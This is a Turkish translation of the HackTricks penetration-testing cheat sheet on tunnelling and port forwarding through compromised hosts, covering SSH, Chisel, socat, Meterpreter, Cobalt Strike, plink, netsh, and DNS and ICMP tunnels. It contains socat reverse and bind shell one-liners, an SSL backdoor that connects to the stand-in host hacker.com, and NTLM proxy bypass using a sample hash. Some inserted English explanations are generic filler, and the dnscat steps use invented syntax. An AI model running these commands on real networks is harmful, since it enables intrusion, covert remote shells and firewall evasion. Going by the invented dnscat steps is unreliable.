# Tünelleme ve Port Yönlendirme

<details>

<summary><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong> ile sıfırdan kahraman olmak için AWS hackleme öğrenin<strong>!</strong></summary>

* Bir **cybersecurity şirketinde** çalışıyor musunuz? **Şirketinizi HackTricks'te reklamını görmek** ister misiniz? veya **PEASS'ın en son sürümüne veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT koleksiyonumuz**](https://opensea.io/collection/the-peass-family)
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter**'da takip edin 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Hacking hilelerinizi [hacktricks repo'ya](https://github.com/carlospolop/hacktricks) ve [hacktricks-cloud repo'ya](https://github.com/carlospolop/hacktricks-cloud) PR göndererek paylaşın**.

</details>

## Nmap ipucu

{% hint style="warning" %}
**ICMP** ve **SYN** taramaları socks proxy üzerinden tünellenemez, bu yüzden bunun çalışması için **ping keşfini devre dışı bırakmalıyız** (`-Pn`) ve **TCP taramalarını** (`-sT`) belirtmeliyiz.
{% endhint %}

## **Bash**

**Host -> Jump -> InternalA -> InternalB**
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

SSH grafik bağlantısı (X)
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Yerel Port2Port

SSH Sunucusunda yeni bir port açın --> Diğer port
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

Yerel port --> Kompromize edilmiş ana bilgisayar (SSH) --> Üçüncü\_kutu:Port
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

Yerel Port --> Kompromize edilmiş ana bilgisayar (SSH) --> Herhangi bir yer
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Ters Port Yönlendirme

Bu, iç ağdaki sunuculardan ters kabuk almak için DMZ üzerinden ana bilgisayarınıza yararlı olabilir:
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and caputure it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tünel

Her iki cihazda da **root erişimi** gereklidir (yeni arayüzler oluşturacağınız için) ve sshd yapılandırması root girişine izin vermelidir:\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ifconfig tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ifconfig tun0 up #Activate the server side network interface
```
Sunucu tarafında yönlendirmeyi etkinleştirin

```bash
sysctl -w net.ipv4.ip_forward=1
```

veya

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
```

Bu, sunucunun paketleri başka bir ağ arabirimine yönlendirmesine izin verir.
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
Müşteri tarafında yeni bir rota belirleyin.
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
## SSHUTTLE

Bir ana bilgisayar üzerinden bir alt ağa yönlendirme yaparak tüm trafiği ssh ile tünelleyebilirsiniz.\
Örneğin, 10.10.10.0/24'e giden tüm trafiği yönlendirebilirsiniz.
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
Özel anahtar ile bağlantı kurun
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

### Port2Port

Yerel port --> Kompromize edilmiş ana bilgisayar (aktif oturum) --> Üçüncü\_kutu:Port
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
SOCKS (Socket Secure) protokolü, ağ trafiğini bir ağdaki bir cihazdan diğerine yönlendirmek için kullanılan bir protokoldür. SOCKS, TCP/IP tabanlı uygulamaların güvenli bir şekilde çalışmasını sağlar ve ağ trafiğini güvenli bir şekilde yönlendirmek için bir proxy sunucusu kullanır. SOCKS, port yönlendirme ve tünel oluşturma gibi özellikleri destekler ve genellikle VPN bağlantıları ve anonim internet erişimi için kullanılır.

SOCKS protokolü, bir istemci-sunucu modeline dayanır. İstemci, SOCKS sunucusuna bağlanır ve hedef sunucuya erişmek için SOCKS sunucusunu kullanır. SOCKS sunucusu, istemcinin kimliğini doğrular ve ardından istemcinin taleplerini hedef sunucuya ileterek trafiği yönlendirir.

SOCKS, TCP ve UDP trafiğini destekler ve genellikle web tarayıcıları, e-posta istemcileri ve diğer ağ uygulamaları tarafından kullanılır. SOCKS proxy sunucusu, istemci cihazın IP adresini gizleyerek anonimlik sağlar ve internete erişimi sınırlı olan ağlarda kullanılabilir.

SOCKS, güvenli bir şekilde ağ trafiğini yönlendirmek için kullanılan etkili bir protokoldür. Ancak, güvenlik açıkları ve zayıflıklar da içerebilir, bu nedenle SOCKS proxy sunucusu kullanırken dikkatli olunmalıdır.
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
Başka bir yöntem:
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

### SOCKS proxy

Beacon üzerinden trafiği yönlendirmek için kullanılabilecek tüm arayüzlerde dinleyen bir port açın.
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

{% hint style="warning" %}
Bu durumda, **port, beacon ana bilgisayarında açılır**, Takım Sunucusunda değil ve trafik Takım Sunucusuna gönderilir ve oradan belirtilen hedef:porta yönlendirilir.
{% endhint %}
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
Not:

- Beacon'ın ters port yönlendirmesi, bireysel makineler arasında iletim yapmak için değil, trafikyi Takım Sunucusuna tünelleme amacıyla tasarlanmıştır.
- Trafik, P2P bağlantılar dahil olmak üzere Beacon'ın C2 trafiği içinde tünellenir.
- Yüksek portlarda ters port yönlendirmeleri oluşturmak için **yönetici ayrıcalıkları gerekli değildir**.

### rPort2Port yerel

{% hint style="warning" %}
Bu durumda, **port Beacon ana bilgisayarında açılır**, Takım Sunucusunda değil ve trafik, Cobalt Strike istemcisine (Takım Sunucusuna değil) ve oradan belirtilen ana bilgisayar:port'a gönderilir.
{% endhint %}
```
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

Bir web dosyası tüneli yüklemeniz gerekmektedir: ashx|aspx|js|jsp|php|php|jsp
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

Chisel'i [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel) adresindeki sürümler sayfasından indirebilirsiniz.\
**İstemci ve sunucu için aynı sürümü kullanmanız gerekmektedir.**

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Port yönlendirme

Port yönlendirme, bir ağdaki bir cihazın belirli bir portundaki trafiği başka bir cihaza yönlendirmek için kullanılan bir yöntemdir. Bu, ağdaki cihazların belirli bir hizmete erişmesini sağlar. Port yönlendirme, ağ güvenlik duvarları ve NAT (Network Address Translation) gibi ağ yapılandırmalarını aşmak için kullanılabilir.

Port yönlendirme, yerel bir ağdaki bir cihazın dış ağdaki bir hizmete erişmesini sağlamak için de kullanılabilir. Örneğin, bir ev ağındaki bir bilgisayarın, internet üzerindeki bir sunucuya bağlanmasını sağlamak için port yönlendirme kullanılabilir.

Port yönlendirme genellikle aşağıdaki iki yöntemle gerçekleştirilir:

1. **Local Port Forwarding (Yerel Port Yönlendirme):** Yerel bir cihazın belirli bir portundaki trafiği başka bir cihaza yönlendirir. Bu yöntem, bir yerel ağdaki bir cihazın dış ağdaki bir hizmete erişmesini sağlar.

2. **Remote Port Forwarding (Uzak Port Yönlendirme):** Uzak bir cihazın belirli bir portundaki trafiği başka bir cihaza yönlendirir. Bu yöntem, bir dış ağdaki bir cihazın yerel ağdaki bir hizmete erişmesini sağlar.

Port yönlendirme, birçok farklı senaryoda kullanılabilir ve birçok farklı protokolü destekler. Bu yöntem, ağ güvenliği testleri ve uzaktan erişim gibi birçok uygulama için önemlidir.
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Ters tünel. Tünel, kurban tarafından başlatılır.\
127.0.0.1:1080 üzerinde bir socks4 proxy oluşturulur.
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
**NTLM proxy** üzerinden geçiş yapma

NTLM proxy üzerinden geçiş yapmak, bir ağda hedefe erişmek için kullanılan bir yöntemdir. Bu yöntem, bir ara sunucu (proxy) kullanarak hedefe doğrudan erişim sağlamak yerine, ara sunucu üzerinden geçiş yapmayı içerir. NTLM proxy, NTLM kimlik doğrulama protokolünü kullanarak kullanıcı kimlik bilgilerini doğrular ve hedef sunucuya erişim sağlar.

Bu yöntemi kullanarak, hedef sunucuya erişmek için aşağıdaki adımları izleyebilirsiniz:

1. NTLM proxy sunucusuna bağlanın.
2. NTLM kimlik doğrulama protokolünü kullanarak kimlik bilgilerinizi doğrulayın.
3. Proxy sunucusu üzerinden hedef sunucuya yönlendirilen bir tünel oluşturun.
4. Oluşturulan tünel üzerinden hedef sunucuya erişim sağlayın.

Bu yöntem, hedef sunucuya doğrudan erişim sağlayamadığınız durumlarda kullanışlı olabilir. NTLM proxy üzerinden geçiş yaparak, ağdaki güvenlik duvarlarını aşabilir ve hedef sunucuya erişim sağlayabilirsiniz. Ancak, bu yöntemi kullanırken dikkatli olmalı ve yasal izinler çerçevesinde hareket etmelisiniz.
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Bağlama kabuğu
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
A reverse shell is a technique used in hacking to establish a connection between the attacker's machine and the target machine. This allows the attacker to gain control over the target machine and execute commands remotely.

To create a reverse shell, the attacker first needs to set up a listener on their machine. This can be done using tools like Netcat or Metasploit. The listener will wait for a connection from the target machine.

Next, the attacker needs to execute a payload on the target machine that will connect back to the listener. This can be done by exploiting vulnerabilities in the target system or by tricking the user into running a malicious script or executable.

Once the connection is established, the attacker can interact with the target machine's command prompt and execute commands as if they were physically present on the machine. This allows them to perform various malicious activities, such as stealing sensitive data, installing malware, or pivoting to other machines on the network.

Reverse shells are commonly used in post-exploitation scenarios during penetration testing or in real-world attacks to maintain persistent access to a compromised system. They provide a covert way for attackers to control the target machine without being detected.
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
Port2Port is a technique used to establish a direct connection between two network ports. This technique is commonly used in situations where direct communication between two hosts is not possible due to network restrictions or firewalls.

To set up a Port2Port connection, a tunneling protocol is used. This protocol encapsulates the data from one port and sends it to the other port through an intermediate server. The intermediate server acts as a mediator, forwarding the data between the two ports.

Port2Port can be used for various purposes, such as bypassing network restrictions, accessing services on a remote network, or creating secure connections between two hosts. It is commonly used in scenarios where traditional methods like port forwarding or VPNs are not feasible.

To establish a Port2Port connection, you need to follow these steps:

1. Set up an intermediate server that will act as the mediator between the two hosts.
2. Configure the server to allow incoming connections on the desired port.
3. On the source host, establish a connection to the intermediate server using a tunneling protocol.
4. On the destination host, establish a connection to the intermediate server using the same tunneling protocol.
5. Once the connections are established, data can be exchanged between the two hosts through the intermediate server.

Port2Port is a versatile technique that can be used in various scenarios to establish direct connections between network ports. It provides a flexible solution for bypassing network restrictions and accessing services on remote networks.
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### Socks üzerinden Port2Port

Bir hedef sunucuya doğrudan erişim sağlamak mümkün olmadığında, port yönlendirme (port forwarding) tekniklerini kullanarak hedef sunucuya erişim sağlamak mümkündür. Bu tekniklerden biri de socks üzerinden port yönlendirme yapmaktır.

Socks, ağ trafiğini yönlendirmek için kullanılan bir protokoldür. Socks proxy sunucusu, istemci cihazın ağ trafiğini alır ve hedef sunucuya iletmek için kullanılır. Bu sayede, hedef sunucuya doğrudan erişim sağlamak yerine, trafiği socks proxy sunucusu üzerinden yönlendirerek hedef sunucuya erişim sağlanır.

Port yönlendirme işlemi için, bir socks proxy sunucusuna bağlanarak istemci cihazın yerel bir portunu hedef sunucunun belirli bir portuna yönlendirmek gerekmektedir. Bu sayede, istemci cihaz üzerinden yapılan bağlantılar socks proxy sunucusu üzerinden hedef sunucuya iletilir.

Port yönlendirme işlemi için aşağıdaki adımları izleyebilirsiniz:

1. Bir socks proxy sunucusuna bağlanın.
2. İstemci cihazınızın yerel bir portunu hedef sunucunun belirli bir portuna yönlendirin.
3. İstemci cihazınız üzerinden yapılan bağlantılar socks proxy sunucusu üzerinden hedef sunucuya iletilir.

Bu yöntem, hedef sunucuya doğrudan erişim sağlanamadığı durumlarda kullanışlı olabilir. Ancak, socks proxy sunucusunun güvenliği ve güvenilirliği önemlidir. Güvenilir olmayan bir socks proxy sunucusu kullanmak, trafiğinizi kötü niyetli kişilerin elde etmesine neden olabilir. Bu nedenle, güvenilir bir socks proxy sunucusu kullanmanız önemlidir.
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### SSL Socat ile Meterpreter

Bu yöntemde, Meterpreter kabuğunu hedef sistemdeki bir bağlantı noktasına yönlendirmek için SSL Socat kullanılır. Bu, ağ trafiğini şifrelemek için SSL/TLS protokolünü kullanır ve güvenli bir iletişim kanalı sağlar.

#### Adım 1: SSL Sertifikası Oluşturma

Öncelikle, SSL sertifikası oluşturmanız gerekmektedir. Bu sertifika, SSL Socat'ın güvenli bir bağlantı sağlamak için kullanacağı bir anahtar ve sertifika çiftidir. Aşağıdaki komutu kullanarak bir sertifika oluşturabilirsiniz:

```plaintext
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
```

#### Adım 2: SSL Socat'ı Başlatma

SSL Socat'ı başlatmak için aşağıdaki komutu kullanabilirsiniz:

```plaintext
socat OPENSSL-LISTEN:443,cert=certificate.pem,key=key.pem,fork TCP4:127.0.0.1:4444
```

Bu komut, SSL Socat'ı 443 numaralı bağlantı noktasında dinlemeye başlar ve gelen bağlantıları 4444 numaralı bağlantı noktasına yönlendirir.

#### Adım 3: Meterpreter'ı Başlatma

Son olarak, Meterpreter kabuğunu başlatmak için aşağıdaki komutu kullanabilirsiniz:

```plaintext
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 127.0.0.1
set LPORT 4444
exploit
```

Bu komutlar, Meterpreter'ı dinlemek için bir exploit/handler modülü kullanır ve hedef sistemdeki 4444 numaralı bağlantı noktasına geri dönüşlü bir TCP bağlantısı oluşturur.

Artık hedef sistemdeki bir bağlantı noktasına yönlendirilen Meterpreter kabuğuna SSL Socat üzerinden güvenli bir şekilde erişebilirsiniz.
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
**Non yetkilendirilmiş bir proxy**'yi atlamak için, kurbanın konsolunda son yerine bu satırı çalıştırabilirsiniz:
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/socat-ve-metasploit-ile-ters-ssl-backdoor/](https://funoverip.net/2011/01/socat-ve-metasploit-ile-ters-ssl-backdoor/)

### SSL Socat Tüneli

**/bin/sh konsolu**

Her iki tarafta da sertifikalar oluşturun: İstemci ve Sunucu
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Uzaktan Port2Port

Yerel SSH bağlantı noktasını (22) saldırganın ana bilgisayarının 443 bağlantı noktasına bağlayın.
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

Bu, bir konsol PuTTY sürümü gibidir (seçenekler bir ssh istemcisiyle çok benzerdir).

Bu ikili, kurban üzerinde çalıştırılacağından ve bir ssh istemcisi olduğundan, ters bağlantıya sahip olabilmek için ssh hizmetimizi ve bağlantı noktasını açmamız gerekmektedir. Ardından, yalnızca yerel olarak erişilebilen bir bağlantı noktasını makinedeki bir bağlantı noktasına yönlendirmek için:
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

Herhangi bir bağlantı noktası için yerel yönetici olmanız gerekmektedir.
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

Sisteme **RDP erişimi** sahip olmanız gerekmektedir.\
İndirin:

1. [SocksOverRDP x64 İkili Dosyaları](https://github.com/nccgroup/SocksOverRDP/releases) - Bu araç, Windows'un Uzak Masaüstü Hizmeti özelliğinin `Dinamik Sanal Kanallarını` (`DVC`) kullanır. DVC, **RDP bağlantısı üzerinden paketleri tünelleme** işleminden sorumludur.
2. [Proxifier Taşınabilir İkili Dosyası](https://www.proxifier.com/download/#win-tab)

İstemci bilgisayarınızda **`SocksOverRDP-Plugin.dll`** dosyasını şu şekilde yükleyin:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
Şimdi **`mstsc.exe`** kullanarak **RDP** üzerinden **hedefe bağlanabiliriz** ve **etkinleştirilmiş** olan **SocksOverRDP eklentisi** tarafından **dinlenecek** olan **127.0.0.1:1080** adresinde bir **uyarı** almalıyız.

**RDP** üzerinden **bağlanın** ve **hedef makineye** `SocksOverRDP-Server.exe` ikili dosyasını **yükleyip çalıştırın**:
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
Şimdi, saldırgan makinenizde (saldırgan) 1080 portunun dinlendiğini doğrulayın:
```
netstat -antb | findstr 1080
```
Artık [**Proxifier**](https://www.proxifier.com/) kullanarak trafiği o porta proxy yapabilirsiniz.

## Windows GUI Uygulamalarını Proxy ile Yönlendirme

Windows GUI uygulamalarını [**Proxifier**](https://www.proxifier.com/) kullanarak proxy üzerinden yönlendirebilirsiniz.\
**Profil -> Proxy Sunucuları** bölümünde SOCKS sunucusunun IP ve portunu ekleyin.\
**Profil -> Proxification Kuralları** bölümünde proxify yapmak istediğiniz programın adını ve proxify yapmak istediğiniz IP'lere olan bağlantıları ekleyin.

## NTLM proxy atlatma

Önceden bahsedilen araç: **Rpivot**\
**OpenVPN** de bunu atlayabilir, yapılandırma dosyasında aşağıdaki seçenekleri ayarlayarak:
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Bu, bir proxyye kimlik doğrulaması yapar ve belirttiğiniz harici hizmete yönlendirilen yerel bir bağlantı noktası oluşturur. Ardından, bu bağlantı noktası üzerinden istediğiniz aracı kullanabilirsiniz.\
Örneğin, 443 numaralı bağlantı noktasını yönlendirir.
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
Şimdi, örneğin kurbanın **SSH** servisini 443 numaralı porta dinlemesi için ayarlarsanız, saldırgan 2222 numaralı port üzerinden buna bağlanabilirsiniz.\
Ayrıca, localhost:443'e bağlanan bir **meterpreter** kullanabilirsiniz ve saldırgan 2222 numaralı portu dinliyor olmalıdır.

## YARP

Microsoft tarafından oluşturulan bir ters proxy. Burada bulabilirsiniz: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)

## DNS Tünellemesi

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

DNS sorgularını kullanarak tun adaptörleri oluşturmak ve veriyi aralarında tünellemek için her iki sistemde de kök yetkisi gereklidir.
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
Tünel çok yavaş olacak. Bu tünel üzerinden sıkıştırılmış bir SSH bağlantısı oluşturabilirsiniz. Bunun için şunu kullanabilirsiniz:
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**Buradan indirin**](https://github.com/iagox86/dnscat2)**.**

DNS üzerinden bir C\&C kanalı oluşturur. Root yetkisi gerektirmez.
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **PowerShell ile**

PowerShell'de bir dnscat2 istemcisini çalıştırmak için [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) kullanabilirsiniz:
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **dnscat ile port yönlendirme**

Port forwarding is a technique used to redirect network traffic from one port on a host to another port on a different host. It is commonly used in situations where direct communication between two hosts is not possible or desired.

Dnscat is a tool that allows you to create a covert communication channel by encapsulating data within DNS queries and responses. It can be used for various purposes, including port forwarding.

To perform port forwarding with dnscat, follow these steps:

1. Install dnscat on both the client and server machines. You can find the installation instructions in the dnscat documentation.

2. Start the dnscat server on the machine that will receive the forwarded traffic. Use the following command:

   ```
   dnscat2 --dns <DNS_SERVER_IP>
   ```

   Replace `<DNS_SERVER_IP>` with the IP address of the DNS server you want to use.

3. Start the dnscat client on the machine that will send the traffic. Use the following command:

   ```
   dnscat2 --dns <DNS_SERVER_IP> --dns-port <DNS_SERVER_PORT> --session <SESSION_NAME>
   ```

   Replace `<DNS_SERVER_IP>` with the IP address of the DNS server, `<DNS_SERVER_PORT>` with the port number of the DNS server, and `<SESSION_NAME>` with a name for the session.

4. On the client machine, create a port forward by running the following command:

   ```
   portfwd add <LOCAL_PORT> <REMOTE_HOST> <REMOTE_PORT>
   ```

   Replace `<LOCAL_PORT>` with the local port number you want to forward, `<REMOTE_HOST>` with the IP address or hostname of the remote host, and `<REMOTE_PORT>` with the port number on the remote host.

5. Test the port forward by connecting to the local port on the client machine. The traffic will be forwarded to the remote host.

Port forwarding with dnscat can be a useful technique in situations where traditional port forwarding methods are blocked or restricted. However, it is important to note that dnscat may raise suspicion and trigger security alerts, so it should be used responsibly and with caution.
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### Proxychains DNS'ini değiştirme

Proxychains, `gethostbyname` libc çağrısını onaylar ve tcp DNS isteğini socks proxy üzerinden tüneller. Proxychains'in **varsayılan olarak** kullandığı **DNS** sunucusu **4.2.2.2**'dir (sabitlenmiş). Bunun değiştirmek için, _/usr/lib/proxychains3/proxyresolv_ dosyasını düzenleyin ve IP'yi değiştirin. Eğer bir **Windows ortamında** iseniz, **etki alanı denetleyicisinin** IP'sini ayarlayabilirsiniz.

## Go'da Tüneller

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

## ICMP Tünelleme

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Her iki sistemde de tun adaptörleri oluşturmak ve ICMP echo isteklerini kullanarak veri tünelleri oluşturmak için kök yetkisi gereklidir.
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**Buradan indirin**](https://github.com/utoni/ptunnel-ng.git).
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

**[ngrok](https://ngrok.com/) bir komut satırıyla çözümleri internete açmak için bir araçtır.**
*Expozisyon URI'leri şu şekildedir:* **UID.ngrok.io**

### Kurulum

- Bir hesap oluşturun: https://ngrok.com/signup
- İstemci indirme:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### Temel kullanımlar

**Dökümantasyon:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

*Gerekirse kimlik doğrulama ve TLS de eklemek mümkündür.*

#### TCP Tünellemesi
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
